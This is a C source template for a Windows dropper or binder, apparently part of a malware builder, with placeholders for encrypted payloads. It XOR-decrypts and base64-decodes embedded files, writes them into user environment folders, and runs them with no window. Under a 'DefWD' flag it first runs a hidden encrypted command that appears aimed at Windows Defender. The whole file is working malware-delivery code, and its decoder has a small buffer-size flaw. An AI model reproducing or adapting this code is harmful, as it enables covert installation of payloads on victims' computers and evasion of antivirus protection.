#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

/* Created by Unam Sanctam, https://github.com/UnamSanctam */

char base46_map[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                     'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                     'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                     'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};

char* base64_decode(char* cipher) {
    char counts = 0;
    char buffer[4];
    char* plain = malloc(strlen(cipher) * 3 / 4);
    int i = 0, p = 0;
    for(i = 0; cipher[i] != '\0'; i++) {
        char k;
        for(k = 0 ; k < 64 && base46_map[k] != cipher[i]; k++);
        buffer[counts++] = k;
        if(counts == 4) {
            plain[p++] = (buffer[0] << 2) + (buffer[1] >> 4);
            if(buffer[2] != 64)
                plain[p++] = (buffer[1] << 4) + (buffer[2] >> 2);
            if(buffer[3] != 64)
                plain[p++] = (buffer[2] << 6) + buffer[3];
            counts = 0;
        }
    }
    plain[p] = '\0';
    return plain;
}

char* cipher(char* data, long dataLen) {
	char* key = "#KEY";
	int keyLen = strlen(key);
	char* output = (char*)malloc(sizeof(char) * dataLen+1);
	output[dataLen] = 0;
	for (int i = 0; i < dataLen; ++i) {
		output[i] = data[i] ^ key[i % keyLen];
	}
	return output;
}

int write_file(char* file, unsigned char* buffer, long length){
	FILE *write_ptr;
	write_ptr = fopen(file,"wb");
	int result = fwrite(buffer, length, 1, write_ptr);
	fclose(write_ptr);
	return result;
}

int run_program(char* file, char* arguments, int hidden){
	PROCESS_INFORMATION p_info;
	STARTUPINFO s_info;

	memset(&s_info, 0, sizeof(s_info));
	memset(&p_info, 0, sizeof(p_info));
	s_info.cb = sizeof(s_info); 

	if(CreateProcess(file, arguments, NULL, NULL, FALSE, (hidden ? CREATE_NO_WINDOW : CREATE_NEW_CONSOLE), NULL, NULL, &s_info, &p_info)){
		CloseHandle(p_info.hProcess);
		CloseHandle(p_info.hThread);
		return 1;
	}
	return 0;
}

int main(int argc, char **argv) 
{
#if DefWD
	run_program(NULL, cipher("#WDCOMMAND", #WDCOMMANDLENGTH), 1);
#endif
	char* stringarray[#ARRAYCOUNT][3] = {#STRINGARRAY};
	long intarray[#ARRAYCOUNT][5] = {#INTARRAY};

	char commandholder[MAX_PATH+1000];

	for(int i = 0; i < #ARRAYCOUNT; ++i){
		sprintf(commandholder, "%s\\%s", getenv(stringarray[i][0]), cipher(stringarray[i][1], intarray[i][0]));
		write_file(commandholder, base64_decode(cipher(stringarray[i][2], intarray[i][2])), intarray[i][3]);
		if(intarray[i][1]){
			run_program(commandholder, NULL, intarray[i][4]);
		}
	}
	return 0;
}